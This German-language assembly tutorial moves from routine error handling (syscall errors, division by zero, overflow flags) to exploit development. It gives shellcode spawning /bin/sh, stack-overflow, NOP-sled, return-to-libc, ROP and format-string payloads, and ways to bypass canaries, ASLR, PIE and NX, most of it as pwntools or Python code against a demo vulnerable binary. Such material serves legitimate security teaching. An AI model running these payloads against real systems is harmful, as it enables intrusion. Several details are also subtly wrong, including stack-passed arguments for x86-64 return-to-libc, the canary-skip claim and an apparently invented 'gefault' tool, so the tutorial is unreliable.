# Assembler: Fehlerbehandlung & Sicherheit

Diese Dokumentation behandelt **Fehlerbehandlung, Sicherheitslücken und Debugging** in Assembler-Programmen auf Linux. Hier lernst du, wie du **Fehler erkennt, vermeidest und ausnutzt** – von einfachen Runtime-Fehlern bis zu fortgeschrittenen Exploit-Techniken.



## 📌 Warum dieses Thema wichtig ist

| Aspekt | Nutzen |
|--------|--------|
| **Fehlervermeidung** | Robustere Programme schreiben |
| **Sicherheitsforschung** | Schwachstellen in Binaries finden |
| **Exploit-Entwicklung** | Sicherheitslücken verstehen und testen |
| **Reverse Engineering** | Malware und Binaries analysieren |
| **Performance-Debugging** | Bottlenecks in niedrigstufigem Code finden |
| **Kernel-Entwicklung** | Stabile Systemsoftware schreiben |



---



## 🚨 Teil 1: Fehlerbehandlung in Assembler



### 📛 Grundlagen der Fehlerbehandlung

In Assembler **gibt es keine Ausnahmen** – Fehler müssen **manuell geprüft** werden. Jeder Syscall, jede Division, jeder Speicherzugriff kann fehlschlagen.



#### Typische Fehlerquellen

| Fehlerquelle | Beispiel | Lösung |
|--------------|----------|--------|
| **Syscall-Fehler** | `open()` scheitert | `rax` prüfen, `errno` setzen |
| **Division by Zero** | `div eax, 0` | Vor Division prüfen |
| **Stack Overflow** | Zu viele `push`-Operationen | Stack-Pointer überwachen |
| **Segmentation Fault** | Zugriff auf `NULL` oder ungültigen Speicher | Zeiger validieren |
| **Overflow/Underflow** | `inc eax` bei `0xFFFFFFFF` | Flag-Register prüfen |
| **Page Fault** | Zugriff auf nicht gemappte Seite | `mmap` prüfen |



---



### 🔍 Syscall-Fehler erkennen und behandeln



#### Grundlagen

- **Erfolg**: `rax` ≥ 0
- **Fehler**: `rax` < 0 → `errno = -rax`



**Beispiel: `open()` mit Fehlerprüfung (x86-64):**
```asm
; open_file.s
.section .data
filename: .ascii "nonexistent.txt\0"
err_msg: .ascii "Error opening file\n"
err_msg_len = . - err_msg

.section .text
.global _start
_start:
    ; open(filename, O_RDONLY)
    mov $2, %rax          ; sys_open
    lea filename, %rdi   ; filename
    xor %rsi, %rsi        ; flags = O_RDONLY
    xor %rdx, %rdx        ; mode = 0
    syscall
    
    ; Fehler prüfen
    cmp $0, %rax
    jl error              ; Springe wenn rax < 0 (Fehler)
    
    ; Datei erfolgreich geöffnet
    mov %rax, %r8        ; fd in r8 speichern
    ; ... Datei verwenden ...
    jmp exit

error:
    ; errno = -rax
    neg %rax
    mov %rax, %r9        ; errno in r9 speichern
    
    ; Fehlermeldung ausgeben
    mov $1, %rax          ; sys_write
    mov $2, %rdi          ; stderr
    lea err_msg, %rsi     ; buffer
    mov $err_msg_len, %rdx ; length
    syscall
    
    ; Fehlercode zurückgeben
    mov $60, %rax         ; sys_exit
    mov %r9, %rdi         ; status = errno
    syscall

exit:
    mov $60, %rax         ; sys_exit
    xor %rdi, %rdi        ; status = 0
    syscall
```



**C-Äquivalent:**
```c
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <stdio.h>

int main() {
    int fd = open("nonexistent.txt", O_RDONLY);
    if (fd < 0) {
        perror("open failed");  // Zeigt: "open failed: No such file or directory"
        return errno;
    }
    close(fd);
    return 0;
}
```



#### Häufige errno-Werte

| errno | Wert | Beschreibung |
|-------|------|--------------|
| `EPERM` | 1 | Operation nicht erlaubt |
| `ENOENT` | 2 | Datei oder Verzeichnis nicht gefunden |
| `EACCES` | 13 | Zugriff verweigert |
| `EFAULT` | 14 | Ungültige Adresse |
| `ENOMEM` | 12 | Nicht genug Speicher |
| `EBUSY` | 16 | Ressource beschäftigt |
| `EINVAL` | 22 | Ungültiges Argument |
| `EMFILE` | 24 | Zu viele geöffnete Dateien |



**errno-Werte anzeigen:**
```bash
# Alle errno-Werte anzeigen
cat /usr/include/asm-generic/errno-base.h
cat /usr/include/asm-generic/errno.h
```



---



### ⚠️ Division by Zero vermeiden



#### Problem

```asm
mov $10, %rax
mov $0, %rbx
div %rbx  ; Division by Zero → SIGFPE (Signal 8)
```

**Ergebnis:** Programm stürzt mit **SIGFPE (Floating Point Exception)** ab.



#### Lösung: Vor Division prüfen

```asm
mov $10, %rax
mov $0, %rbx

; Prüfe ob rbx == 0
cmp $0, %rbx
je division_by_zero  ; Springe wenn gleich

; Division durchführen
div %rbx
jmp done

division_by_zero:
    ; Fehlermeldung ausgeben
    mov $1, %rax          ; sys_write
    mov $2, %rdi          ; stderr
    lea div_zero_msg, %rsi
    mov $div_zero_len, %rdx
    syscall
    
    mov $60, %rax         ; sys_exit
    mov $1, %rdi          ; status = 1 (Fehler)
    syscall

done:
    ; Ergebnis verwenden...
```



#### Alternative: Test-Instruktion

```asm
mov $10, %rax
mov $0, %rbx

; Testet rbx auf Null (setzt Zero-Flag)
test %rbx, %rbx
jz division_by_zero

; Division durchführen
div %rbx
```



---



### 📉 Overflow & Underflow erkennen



#### Arithmetische Flags (EFLAGS/RFLAGS)

| Flag | Bit | Beschreibung | Gesetzt durch |
|------|-----|--------------|---------------|
| **CF** (Carry) | 0 | Carry/Unsigned Overflow | `add`, `sub`, `inc`, `dec` |
| **PF** (Parity) | 2 | Gerade Anzahl von 1-Bits | `add`, `sub`, etc. |
| **AF** (Auxiliary Carry) | 4 | BCD-Carry (Nibble) | `add`, `sub` |
| **ZF** (Zero) | 6 | Ergebnis ist Null | `cmp`, `test`, `add`, `sub` |
| **SF** (Sign) | 7 | Negatives Ergebnis | Arithmetische Operationen |
| **OF** (Overflow) | 11 | **Signed Overflow** | `add`, `sub`, `mul`, `div` |



#### Overflow prüfen (Signed Arithmetic)

**Beispiel: Addition mit Overflow-Prüfung:**
```asm
mov $0x7FFFFFFF, %rax  ; Maximale positive 32-Bit-Zahl
add $1, %rax          ; 0x7FFFFFFF + 1 = 0x80000000 (-2147483648)

; Overflow prüfen (OF-Flag)
jo overflow           ; Springe wenn Overflow (OF=1)

; Kein Overflow
jmp no_overflow

overflow:
    ; Fehlermeldung
    mov $1, %rax
    mov $2, %rdi
    lea overflow_msg, %rsi
    mov $overflow_len, %rdx
    syscall
    jmp exit

no_overflow:
    ; Normal weitermachen
    ...
```



#### Carry prüfen (Unsigned Arithmetic)

**Beispiel: Addition mit Carry-Prüfung:**
```asm
mov $0xFFFFFFFF, %rax  ; Maximale 32-Bit-Zahl
add $1, %rax          ; 0xFFFFFFFF + 1 = 0x00000000 (mit Carry)

; Carry prüfen (CF-Flag)
jc carry_occurred     ; Springe wenn Carry (CF=1)

; Kein Carry
jmp no_carry

carry_occurred:
    ; Fehlermeldung
    ...
```



#### Multiplikation mit Overflow-Prüfung

**Problem:** `mul` und `imul` können Überläufe verursachen.

**Beispiel (32-Bit Multiplikation):**
```asm
mov $0x1000, %eax   ; 4096
mov $0x1000, %ebx   ; 4096

mul %ebx           ; eax = eax * ebx, edx:eax = 64-Bit Ergebnis

; Prüfe ob edx != 0 (Overflow bei 32-Bit)
cmp $0, %edx
jne mul_overflow

; Kein Overflow - Ergebnis passt in 32 Bit
jmp no_overflow

mul_overflow:
    ; Fehlerbehandlung
    ...
```



---



### 🧠 Stack-Overflow vermeiden



#### Problem

```asm
; Endlos rekursiv (Stack wächst bis zum Crash)
call function
function:
    call function  ; Kein Rücksprung → Stack Overflow
```

**Ergebnis:** Programm stürzt mit **SIGSEGV (Segmentation Fault)** ab.



#### Lösung: Stack-Pointer überwachen

```asm
.section .text
.global _start
_start:
    ; Stack-Größe begrenzen
    mov %rsp, %r8        ; Aktuellen Stack-Pointer sichern
    sub $4096, %r8       ; 4KB Stack-Limit
    
    call recursive_func
    
    ; Exit
    mov $60, %rax
    xor %rdi, %rdi
    syscall

recursive_func:
    ; Stack-Limit prüfen
    cmp %rsp, %r8
    jl stack_overflow    ; Springe wenn rsp < r8 (Stack zu voll)
    
    ; Rekursiver Aufruf
    push %rbp
    mov %rsp, %rbp
    
    ; ... Funktion logik ...
    
    pop %rbp
    ret

stack_overflow:
    ; Fehlermeldung
    mov $1, %rax
    mov $2, %rdi
    lea stack_ovf_msg, %rsi
    mov $stack_ovf_len, %rdx
    syscall
    
    mov $60, %rax
    mov $1, %rdi
    syscall
```



#### Stack-Frame-Größe kontrollieren

```asm
function:
    push %rbp            ; 8 Bytes
    mov %rsp, %rbp       ; 8 Bytes
    sub $32, %rsp        ; 32 Bytes für lokale Variablen
    
    ; Stack-Usage: 8 + 8 + 32 = 48 Bytes pro Aufruf
    ; Bei 4KB Stack: Maximal ~85 rekursive Aufrufe
    
    ; ... Funktion logik ...
    
    mov %rbp, %rsp
    pop %rbp
    ret
```



---



### 🔥 Null-Pointer-Dereferenzierung vermeiden



#### Problem

```asm
mov $0, %rax       ; Null-Pointer
mov (%rax), %rbx   ; Lese von Adresse 0 → SIGSEGV
```

**Ergebnis:** Programm stürzt mit **SIGSEGV (Segmentation Fault)** ab.



#### Lösung: Zeiger validieren

```asm
mov pointer, %rax   ; Lade Zeiger

; Prüfe ob NULL
cmp $0, %rax
je null_pointer_error

; Zeiger ist gültig - dereferenzieren
mov (%rax), %rbx

null_pointer_error:
    ; Fehlermeldung
    mov $1, %rax
    mov $2, %rdi
    lea null_ptr_msg, %rsi
    mov $null_ptr_len, %rdx
    syscall
    
    mov $60, %rax
    mov $1, %rdi
    syscall
```



---



## 🔐 Teil 2: Sicherheitslücken in Assembler



### 📚 Grundlagen der Sicherheit



#### Warum Assembler für Sicherheit relevant ist:

1. **Malware-Analyse**: Die meisten Malware-Samples enthalten Assembler-Code
2. **Exploit-Entwicklung**: Sicherheitslücken werden oft auf Assembler-Ebene ausgenutzt
3. **Shellcode**: Payloads werden in Assembler geschrieben
4. **Reverse Engineering**: Binaries werden disassembliert
5. **Performance**: Sicherheitsmechanismen werden auf niedrigster Ebene implementiert



#### Sicherheitsmodell von Linux

```
┌─────────────────────────────────────────────────────────────┐
│                    USER SPACE                                │
├─────────────────────────────────────────────────────────────┤
│  Prozess A  │  Prozess B  │  Prozess C  │  ...                │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐                                │
│  │ Stack   │  │ Stack   │  │ Stack   │                                │
│  │ Heap    │  │ Heap    │  │ Heap    │                                │
│  │ Code    │  │ Code    │  │ Code    │                                │
│  │ Data    │  │ Data    │  │ Data    │                                │
│  └─────────┘  └─────────┘  └─────────┘                                │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│                      KERNEL SPACE                               │
├─────────────────────────────────────────────────────────────┤
│  Systemaufrufe  │  Speicherverwaltung  │  Treiber  │  ...          │
└─────────────────────────────────────────────────────────────┘
```



### 💥 Buffer Overflow Angriffe



#### 1. Stack-Based Buffer Overflow



##### Grundlagen

Der **Stack** speichert:
1. Lokale Variablen
2. Funktionsargumente
3. Rücksprungadresse (`ret`)
4. Base Pointer (`rbp`)



##### Anfälliger C-Code

```c
// vulnerable.c
#include <string.h>

void vulnerable_function(char* input) {
    char buffer[64];
    strcpy(buffer, input);  // KEINE Größenprüfung!
}

int main(int argc, char* argv[]) {
    vulnerable_function(argv[1]);
    return 0;
}
```



##### Stack-Layout

```
Höhere Adressen
┌─────────────────────────────────────┐
│  Argument 2                        │ ← argparse
├─────────────────────────────────────┤
│  Argument 1 (input)                 │
├─────────────────────────────────────┤
│  Rücksprungadresse (ret)             │ ← Überschreiben!
├─────────────────────────────────────┤
│  Altes rbp                         │
├─────────────────────────────────────┤
│  buffer[64]                        │ ← Puffer
├─────────────────────────────────────┤
│  ... (lokaler Stack-Frame)           │
└─────────────────────────────────────┘
Niedrigere Adressen
```



##### Exploit in Python

```python
import struct

# Adresse der Shellcode-Funktion (z. B. 0x401136)
# Finde mit: objdump -d vulnerable | grep shellcode
shellcode_addr = 0x401136

# Buffer füllen: 64 Bytes Puffer + 8 Bytes rbp + 8 Bytes ret
payload = b'A' * 72  # 64 + 8 (rbp)
payload += struct.pack('<Q', shellcode_addr)  # Überschreibe ret

# Ausführen
import subprocess
subprocess.call(['./vulnerable', payload])
```



##### Shellcode in Assembler

```asm
; Shellcode für execve("/bin/sh", NULL, NULL) - x86-64, 30 Bytes
; Kompilieren: nasm -f elf64 shellcode.asm && ld -N shellcode.o -o shellcode

section .text
global _start
_start:
    ; String "/bin//sh" in Register laden
    mov rax, 0x68732f6e69622f2f  ; "/bin//sh" (little-endian)
    push rax
    mov rdi, rsp                ; argv[0] = "/bin//sh"
    
    ; argv = [rdi, NULL]
    push 0
    push rdi
    mov rsi, rsp                ; argv = &argv[0]
    
    ; envp = NULL
    xor rdx, rdx
    
    ; execve("/bin/sh", argv, NULL)
    mov al, 59                 ; sys_execve = 59
    syscall
```



##### Exploit mit NOP-Sled

```python
import struct

# NOP-Sled (0x90 = NOP)
nop_sled = b'\x90' * 100

# Shellcode
shellcode = (
    b'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2'  # xor registers
    b'\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68'  # "/bin//sh"
    b'\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6'  # setup args
    b'\xb0\x3b\x0f\x05'  # execve syscall
)

# Adresse berechnen: buffer + nop_sled
# Annahme: buffer beginnt bei 0x7fffffffe000
buffer_addr = 0x7fffffffe000
shellcode_addr = buffer_addr + len(nop_sled) + 8  # +8 für rbp

payload = nop_sled + shellcode
payload += b'A' * (72 - len(nop_sled) - len(shellcode))  # Auffüllen
payload += struct.pack('<Q', shellcode_addr)  # Überschreibe ret

import subprocess
subprocess.call(['./vulnerable', payload])
```



##### Schutzmechanismen

| Mechanismus | Beschreibung | Umgehung |
|-------------|--------------|-----------|
| **Stack Canary** | Zufälliger Wert vor ret | Canary überspringen oder leaken |
| **ASLR** | Zufällige Adressen | Adressen leaken oder brute-forcen |
| **NX (No-Execute)** | Code auf Stack/Heap verbieten | Return-to-libc, ROP |
| **PIE** | Position Independent Executable | Adressen neu berechnen |
| **SSP** | Stack Smashing Protector | Canary überspringen |



#### 2. Return-to-libc Angriffe



##### Grundlagen

Da **NX-Bit** (No-Execute) das Ausführen von Code auf dem Stack verhindert, kann man stattdessen **bestehende Funktionen** aus Bibliotheken aufrufen.



##### Beispiel: system("/bin/sh") aufrufen

```python
import struct

# Adressen finden:
# gdb> p system
# $1 = (int (*)(const char *)) 0x7ffff7a5e520
# gdb> p "/bin/sh"
# $2 = 0x7ffff7f8d5ec

system_addr = 0x7ffff7a5e520
binsh_addr = 0x7ffff7f8d5ec

# Buffer: 64 Bytes + 8 Bytes rbp + 8 Bytes ret
payload = b'A' * 72
payload += struct.pack('<Q', system_addr)  # ret = system
payload += struct.pack('<Q', binsh_addr)   # Arg 1: "/bin/sh"
payload += struct.pack('<Q', 0)             # Arg 2: NULL (argv)
payload += struct.pack('<Q', 0)             # Arg 3: NULL (envp)

import subprocess
subprocess.call(['./vulnerable', payload])
```



##### Adressen finden

```bash
# Mit gdb
(gdb) p system
(gdb) p exit
(gdb) find /lib/x86_64-linux-gnu/libc.so.6, 0, "/bin/sh"

# Mit readelf
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system

# Mit objdump
objdump -t /lib/x86_64-linux-gnu/libc.so.6 | grep system

# Mit pwntools (Python)
from pwn import *
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
print(hex(libc.symbols['system']))
print(hex(next(libc.search(b'/bin/sh\x00'))))
```



#### 3. Return-Oriented Programming (ROP)



##### Grundlagen

**ROP** nutzt bestehende **Gadgets** (Instruktionsfolgen, die mit `ret` enden) aus dem Programm, um **beliebiges Verhalten** zu erreichen.



##### Gadgets finden

```bash
# Mit ROPgadget
ROPgadget --binary vulnerable > gadgets.txt

# Mit pwntools
from pwn import *
e = ELF('./vulnerable')
rop = ROP(e)
print(rop.dump())
```



##### ROP-Kette erstellen

**Ziel:** `execve("/bin/sh", NULL, NULL)`

1. **Pop rdi; ret** – Arg1 setzen ("/bin/sh")
2. **Pop rsi; ret** – Arg2 setzen (NULL)
3. **Pop rdx; ret** – Arg3 setzen (NULL)
4. **syscall** – execve aufrufen



**Beispiel:**
```python
from pwn import *

# Gadget-Adressen
pop_rdi = 0x4007c3  # pop rdi; ret
pop_rsi = 0x4007c1  # pop rsi; pop r15; ret
pop_rdx = 0x4007b5  # pop rdx; ret
syscall = 0x400530   # syscall

# Strings
binsh_addr = 0x601050  # Adresse von "/bin/sh" im Programm

# ROP-Kette erstellen
rop = flat([
    pop_rdi, binsh_addr,      # rdi = "/bin/sh"
    pop_rsi, 0, 0,            # rsi = NULL (r15 wird auch gepoppt)
    pop_rdx, 0,              # rdx = NULL
    59, syscall              # rax = 59 (execve), syscall
])

# Payload: Buffer + rbp + ROP-Kette
payload = b'A' * 72 + rop

p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```



##### ROPgadget Tools

```bash
# Alle Gadgets anzeigen
ROPgadget --binary vulnerable

# Nur Gadgets mit bestimmten Instruktionen
ROPgadget --binary vulnerable --opcode "pop rdi"

# Gadgets mit bestimmte Register
ROPgadget --binary vulnerable --only "pop|ret"
```



##### 64-Bit ROP mit pwntools

```python
from pwn import *

# Kontext setzen
context.arch = 'amd64'
context.os = 'linux'

# ELF laden
e = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ROP-Kette erstellen
rop = ROP(e)
rop.call(e.symbols['read'], [0, e.bss(), 100])  # read(0, bss, 100)
rop.call(e.symbols['puts'], [e.bss()])          # puts(bss)
rop.call('system', [e.bss()])                  # system(bss)

# Payload
payload = b'A' * 72 + rop.chain()

p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```



#### 4. Heap-Based Exploits



##### Grundlagen

Der **Heap** speichert dynamisch allokierte Daten (`malloc`, `free`).



##### Typische Heap-Angriffe

| Angriff | Beschreibung |
|---------|--------------|
| **Use-After-Free** | Freigegebenen Speicher erneut nutzen |
| **Double Free** | Speicher zweimal freigeben |
| **Heap Overflow** | Puffer im Heap überlaufen lassen |
| **tcache Poisoning** | tcache manipulieren |
| **House of Force** | Heap-Metadata manipulieren |



##### Beispiel: Use-After-Free

```c
// use_after_free.c
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[32];
    int (*func)();
} Person;

void evil_function() {
    system("/bin/sh");
}

int main() {
    Person* p = malloc(sizeof(Person));
    strcpy(p->name, "Alice");
    p->func = NULL;
    
    free(p);
    
    // Speicher wird nicht auf NULL gesetzt
    Person* p2 = malloc(sizeof(Person));
    strcpy(p2->name, "Bob");
    p2->func = evil_function;
    
    free(p2);
    
    // p zeigt immer noch auf freigegebenen Speicher
    // Wenn malloc diesen Speicher wieder vergibt...
    Person* p3 = malloc(sizeof(Person));
    strcpy(p3->name, "Charlie");
    
    // Wenn p3 am gleichen Ort wie p allokiert wird...
    // können wir p->func aufrufen
    if (p->func != NULL) {
        p->func();  // Aufruf von evil_function!
    }
    
    free(p3);
    return 0;
}
```



##### Heap-Tools

```bash
# Heap-Analyse mit gdb
(gdb) x/20x 0x555555757000  # Heap-Inhalt anzeigen
(gdb) heap bins          # Heap-Bins anzeigen (mit gefault)

# Heap-Visualisierung
https://github.com/gdbinit/HexGdb
```



##### pwntools für Heap-Exploits

```python
from pwn import *

# Heap-Allokationen
p = process('./heap_vulnerable')

# Use-After-Free Exploit
p.sendline(b'malloc 32')
p.sendline(b'write 0 AA')
p.sendline(b'free 0')
p.sendline(b'malloc 32')
p.sendline(b'write 0 BB')

# Jetzt zeigt der erste Pointer auf "BB"
p.interactive()
```



#### 5. Format String Vulnerabilities



##### Grundlagen

`printf`-Familie kann **Format-Specifier** interpretieren und **Speicher lesen/schreiben**.



##### Anfälliger Code

```c
// format_vuln.c
#include <stdio.h>

int main(int argc, char* argv[]) {
    printf(argv[1]);  // Benutzerkontrollierter Format-String!
    return 0;
}
```



##### Angriffe

| Angriff | Beispiel | Ergebnis |
|---------|----------|---------|
| **Speicher lesen** | `%x %x %x` | Leakt Stack-Inhalte |
| **Speicher schreiben** | `%n` | Schreibt Anzahl der ausgegebenen Zeichen |
| **Arbitrary Read** | `%s` mit Adresse | Liest String von Adresse |
| **Arbitrary Write** | `%n` mit Adresse | Schreibt an Adresse |



##### Beispiel: Speicher auslesen

```bash
# Stack-Inhalte anzeigen
./format_vuln "%x %x %x %x %x"
# Ausgabe: bffff7c0 b7fe1b34 b7fe1b34 41 41
```



##### Beispiel: Arbitrary Write mit `%n`

```c
// Ziel: Variable auf 0x41414141 setzen
int target = 0;

int main(int argc, char* argv[]) {
    printf(argv[1]);
    if (target == 0x41414141) {
        system("/bin/sh");
    }
    return 0;
}
```

**Exploit:**
```python
import struct

target_addr = 0xbffff7c0  # Adresse von target (mit gdb finden)

# Format-String: AAAA + %p %p %p %p %n
# %n schreibt die Anzahl der bisher ausgegebenen Zeichen an die Adresse
payload = struct.pack('<I', target_addr) + b'AAAA %n'

import subprocess
subprocess.call(['./format_vuln', payload])
```



##### Format-String mit Offset

```python
from pwn import *

# Adresse von target
target_addr = 0xbffff7c0

# Format-String mit Offset
# "AAAA " (4 Bytes) + Adresse (4 Bytes) + "%1$n"
payload = p32(target_addr) + b'%1$n'

# Oder mit Füllbytes:
payload = b'AAAA' + p32(target_addr) + b'%10x%1$n'
# 10x füllt bis zur Adresse auf
```



##### Beispiel: Arbitrary Read mit `%s`

```python
from pwn import *

# Adresse, von der wir lesen wollen
secret_addr = 0x804a020

# Format-String: Adresse + %s
payload = p32(secret_addr) + b'%s'

p = process('./format_vuln')
p.sendline(payload)
print(p.recvline())  # Liest String von secret_addr
```



---



## 🛡️ Teil 3: Schutzmechanismen & Umgehung



### 1. Stack Canaries



#### Wie es funktioniert

Ein **zufälliger Wert** (Canary) wird **vor der Rücksprungadresse** auf dem Stack platziert. Vor dem Rücksprung wird der Canary geprüft.



#### Canary prüfen

```bash
# Mit gdb
(gdb) x/10x $rsp
# Suche nach zufälligen Werten vor ret

# Canary mit pwntools finden
from pwn import *
e = ELF('./programm')
print(e.canary)
```


#### Canary umgehen

**Methode 1: Canary leaken**
```python
from pwn import *

p = process('./programm')

# Canary auslesen (Format-String oder Buffer Overflow)
payload = b'A' * 64 + b'%p.%p.%p.%p'  # Canary liegt bei Offset 64
p.sendline(payload)
leak = p.recvline()
canary = int(leak.split('.')[2], 16)
print(f"Canary: {hex(canary)}")

# Jetzt können wir den Canary in den Exploit einbauen
payload2 = b'A' * 64 + p64(canary) + b'B' * 8 + p64(system_addr)
p.sendline(payload2)
```


**Methode 2: Canary überspringen**
```python
# Wenn wir wissen, dass der Canary bei Offset 64 liegt
# und wir nur die Rücksprungadresse überschreiben wollen:
payload = b'A' * 72 + p64(shellcode_addr)  # 64 (Puffer) + 8 (Canary) = 72
```



### 2. ASLR (Address Space Layout Randomization)



#### Wie es funktioniert

- **Stack**, **Heap**, **Libraries** und **Executable** werden bei jedem Start an **zufällige Adressen** geladen.
- Macht **Absolute Adressen** in Exploits unbrauchbar.



#### ASLR prüfen

```bash
# ASLR-Status prüfen
cat /proc/sys/kernel/randomize_va_space
# 0 = deaktiviert, 1 = partiell, 2 = vollständig

# ASLR für einen Prozess deaktivieren
setarch $(uname -m) -R ./programm

# ASLR global deaktivieren (für Testing)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```


#### ASLR umgehen

**Methode 1: Adressen leaken**
```python
from pwn import *

p = process('./programm')

# Library-Adresse leaken
p.sendline(b'%p.%p.%p')
leak = p.recvline()
libc_base = int(leak.split('.')[1], 16) - libc.symbols['puts']
print(f"libc base: {hex(libc_base)}")

# Jetzt können wir system-Adresse berechnen
system_addr = libc_base + libc.symbols['system']
```


**Methode 2: Brute Force (bei partieller ASLR)**
```python
from pwn import *
import time

# Annahme: Nur 1 Byte Randomisierung (z. B. bei 32-Bit)
base = 0xb7000000
for i in range(256):
    try:
        p = process('./programm', env={'LD_PRELOAD': './libc.so.6'})
        # Adresse berechnen
        target = base + (i << 16)
        payload = b'A' * 72 + p32(target)
        p.sendline(payload)
        p.recv(timeout=0.1)
        p.close()
    except:
        continue
```


**Methode 3: Info Leaks (z. B. über Umgebungsvariablen)**
```bash
# Umgebung anzeigen
ldd ./programm
strings /proc/<PID>/maps
```



### 3. NX (No-Execute) / DEP



#### Wie es funktioniert

- **Stack** und **Heap** sind **nicht ausführbar** (NX-Bit gesetzt).
- Verhindert **Shellcode-Ausführung** auf Stack/Heap.



#### NX prüfen

```bash
# NX-Status prüfen
readelf -l ./programm | grep GNU_STACK
# GNU_STACK 0x000000 0x0000000000000000 0x0000000000000000 0x00 0x00 RWE 0x0
# RWE = Read/Write/Execute
# Wenn nur RW (ohne E), ist NX aktiv

# Mit checksec
checksec ./programm
# Output: NX enabled
```


#### NX umgehen

**Methode 1: Return-to-libc**
- Nutze bestehende Funktionen aus Bibliotheken

**Methode 2: ROP (Return-Oriented Programming)**
- Nutze Gadgets aus dem Programm

**Methode 3: JIT-Spray (selten)**
- Speicher mit ausführbarem Code füllen

**Methode 4: mprotect**
- Speicher ausführbar machen (wenn möglich)



### 4. PIE (Position Independent Executable)



#### Wie es funktioniert

- Das **Hauptprogramm** wird bei jeder Ausführung an einer **zufälligen Adresse** geladen.
- Macht **Code-Adressen** unvorhersehbar.



#### PIE prüfen

```bash
# PIE-Status prüfen
readelf -h ./programm | grep Type
# Type: DYN (PIE) oder EXEC (nicht PIE)

# Mit checksec
checksec ./programm
# Output: PIE enabled
```


#### PIE umgehen

**Methode 1: Basisadresse leaken**
```python
from pwn import *

p = process('./programm')

# Funktion aus dem Programm aufrufen und Adresse leaken
p.sendline(b'%p')
leak = p.recvline()
func_addr = int(leak, 16)
base_addr = func_addr - e.symbols['main']
print(f"Base: {hex(base_addr)}")

# Jetzt können wir alle Adressen relativ berechnen
```


**Methode 2: Relative Adressen nutzen**
```python
# Wenn wir wissen, dass unser Shellcode bei base + 0x1000 liegt
# und wir die Basisadresse leaken können:
base_addr = 0x555555554000  # Beispiel
shellcode_addr = base_addr + 0x1000
```



### 5. Stack Smashing Protector (SSP)



#### Wie es funktioniert

- Ähnlich wie Stack Canaries, aber mit **GCC-implementiertem Schutz**
- Nutzt **`__stack_chk_fail`** bei Canary-Verletzung



#### SSP prüfen

```bash
# Mit checksec
checksec ./programm
# Output: Stack Canary found

# Mit objdump
objdump -d ./programm | grep __stack_chk_fail
```


#### SSP umgehen

- **Canary leaken** (wie bei Stack Canaries)
- **Canary bruteforcen** (bei 32-Bit mit 4 Bytes)
- **Alternative Angriffsvektoren** nutzen (Heap, Format String, etc.)



### 6. Full RELRO (Relocation Read-Only)



#### Wie es funktioniert

- **GOT (Global Offset Table)** ist **schreibgeschützt**
- Verhindert **GOT-Overflow** Angriffe



#### RELRO prüfen

```bash
# Mit checksec
checksec ./programm
# Output: Full RELRO

# Mit readelf
readelf -l ./programm | grep RELRO
```


#### RELRO umgehen

**Partial RELRO:**
- GOT ist beschreibbar → **GOT-Overflow** möglich

**Full RELRO:**
- GOT ist schreibgeschützt → **Return-to-libc** oder **ROP** nötig



---



## 🔍 Teil 4: Debugging & Analyse-Tools



### 1. GDB für Sicherheitsanalyse



#### Grundlegende Befehle

```bash
# Programm mit Debug-Symbolen kompilieren
gcc -g vulnerable.c -o vulnerable

# GDB starten
gdb ./vulnerable

# Breakpoint bei main setzen
(gdb) break main

# Programm starten
(gdb) run AAAAAAAA...

# Nach Crash: Register anzeigen
(gdb) info registers
(gdb) x/20x $rsp  # Stack-Inhalt anzeigen
```



#### Nützliches für Exploit-Entwicklung

```bash
# Pattern erstellen für Offset-Finden
(gdb) pattern create 100
# AAAA... (100 Bytes)

# Programm mit Pattern starten
(gdb) run $(python -c "from pwn import *; print(cyclic(100))")

# Nach Crash: Offset finden
(gdb) x/s $rsp
# z. B.: 0x4141414141414161
(gdb) pattern offset $rsp
# Gibt Offset an, bei dem der Crash auftrat
```



#### Gefault (GDB Enhancement)

```bash
# Installieren
pip install gefault

# Verwenden in GDB
(gdb) gefault
# Zeigt detaillierte Fehlerinformationen
```



#### Pwndbg / PEDA / GEF

**Pwndbg:**
```bash
# Installieren
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

**PEDA:**
```bash
git clone https://github.com/longld/peda
cp peda/peda.py ~/.gdbinit
```

**GEF:**
```bash
git clone https://github.com/hugsy/gef
cp gef/gef.py ~/.gdbinit
```

**Features:**
- **Farbliche Register-Ansicht**
- **Stack-Ansicht**
- **Heap-Ansicht**
- **Automatische Exploit-Erkennung**
- **One-Gadget-Finder**



### 2. Checksec



#### Installation

```bash
# Auf Kali Linux bereits installiert
# Oder:
git clone https://github.com/slimm609/checksec.sh
chmod +x checksec.sh
sudo cp checksec.sh /usr/local/bin/checksec
```


#### Verwendung

```bash
checksec ./programm
```

**Beispielausgabe:**
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols     No    0               2               ./programm
```



### 3. ROPgadget



#### Installation

```bash
sudo apt install ropgadget
```


#### Verwendung

```bash
# Alle Gadgets anzeigen
ROPgadget --binary vulnerable

# Gadgets mit bestimmten Instruktionen
ROPgadget --binary vulnerable --opcode "pop rdi"

# Gadgets für alle Register
ROPgadget --binary vulnerable --only "pop|ret"

# Gadgets mit bestimmte Adresse
ROPgadget --binary vulnerable --ropchain
```



### 4. One_Gadget



#### Installation

```bash
gem install one_gadget
```


#### Verwendung

```bash
# One-Gadgets in libc finden
one_gadget libc.so.6

# Beispielausgabe:
# 0x4f3d5 execve("/bin/sh", esp+0x44, environ)
# constraints:
#   [esp+0x44] == NULL || [esp+0x44] == 0
#   [esp] == NULL

# Mit pwntools
from pwn import *
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
